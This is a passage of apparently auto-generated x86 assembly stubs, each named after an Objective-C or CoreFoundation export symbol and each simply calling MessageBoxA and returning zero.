call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierRepublicOfChina
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSChineseCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCurrentLocaleDidChangeNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSDefaultRunLoopMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSGenericException
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSGetSizeAndAlignment
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSGregorianCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSHebrewCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSISO8601Calendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSIndianCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSInternalInconsistencyException
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSInvalidArgumentException
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSIslamicCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSIslamicCivilCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSJapaneseCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleAlternateQuotationBeginDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleAlternateQuotationEndDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCalendarIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCalendarIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCalendarKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCollationIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCollationIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCollatorIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCollatorIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCountryCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCountryCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCurrencyCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCurrencyCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCurrencySymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleCurrencySymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleDecimalSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleDecimalSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleExemplarCharacterSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleExemplarCharacterSetKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleGroupingSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleGroupingSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleLanguageCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleLanguageCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleMeasurementSystem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleMeasurementSystemKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleQuotationBeginDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleQuotationEndDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleScriptCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleScriptCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleUsesMetricSystem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleUsesMetricSystemKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleVariantCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSLocaleVariantCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSMallocException
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSPersianCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSRangeException
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSRepublicOfChinaCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSRunLoopCommonModes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSStreamDataWrittenToMemoryStreamKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSStreamFileCurrentOffsetKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSSystemClockDidChangeNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSSystemTimeZoneDidChangeNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSURLCustomIconKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSURLEffectiveIconKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSURLIsDirectoryKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSURLLabelColorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSURLNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_CFXPreferencesCompatibilitySource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_CFXPreferencesManagedSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_CFXPreferencesPropertyListSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_CFXPreferencesPropertyListSourceSynchronizer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_CFXPreferencesSearchListSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_CFXPreferencesSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_CFXPreferencesWindowsSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSBlockInvocation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSDateComponents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSException
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSInputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSInvocation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSMessageBuilder
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSMethodSignature
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSMutableArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSMutableData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSMutableDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSMutableOrderedSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSMutableSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSNull
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSOrderedSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSOutputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSSharedKeyDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSSharedKeySet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSTimer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NSUserDefaults
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$_NotificationClient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$__NSZombie_
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___CFNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSArrayI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSArrayM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSArrayReverseEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSArrayReversed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSAtom
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSAutoBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSBlockVariable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFAttributedString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFBoolean
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFCharacterSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFConstantString0
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFInputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFOutputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFTimer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSCFType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSDictionaryI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSDictionaryM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSDictionaryObjectEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSFastEnumerationEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSFinalizingBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSGenericDeallocHandler
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSGlobalBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSLocalTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSMallocBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSOrderedSetArrayProxy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSOrderedSetI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSOrderedSetM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSOrderedSetReverseEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSOrderedSetReversed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSOrderedSetSetProxy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSPlaceholderArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSPlaceholderDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSPlaceholderDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSPlaceholderOrderedSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSPlaceholderSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSPlaceholderTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSSKGraph
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSSetI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSSetM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSStackBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_CLASS_$___NSTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_CFXPreferencesCompatibilitySource$accessLock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_CFXPreferencesWindowsSource$accessLock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSMessageBuilder$_addr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSMessageBuilder$_target
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSMessageBuilder$isa
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSRunLoop$_dperf
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSRunLoop$_info
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSRunLoop$_perft
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSRunLoop$_ports
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSRunLoop$_reserved
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSRunLoop$_rl
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSURL$_baseURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSURL$_clients
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSURL$_reserved
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSURL$_urlString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSUserDefaults$_private
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$_NSUserDefaults$_reserved
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$__NSZombie_$isa
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___CFNotification$_dyingObject
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___CFNotification$_fouSemantics
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___CFNotification$_name
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___CFNotification$_object
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___CFNotification$_userInfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSArrayI$_used
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSArrayM$_list
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSArrayM$_mutations
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSArrayM$_used
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSArrayM__GRBF_1
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSAtom$isa
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSBlockVariable$byref_destroy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSBlockVariable$byref_keep
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSBlockVariable$containedObject
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSBlockVariable$flags
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSBlockVariable$forwarding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSBlockVariable$size
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFData$_bytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFData$_bytesDeallocator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFData$_capacity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFData$_cfinfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFData$_length
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFDictionary$_bits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFDictionary$_callbacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
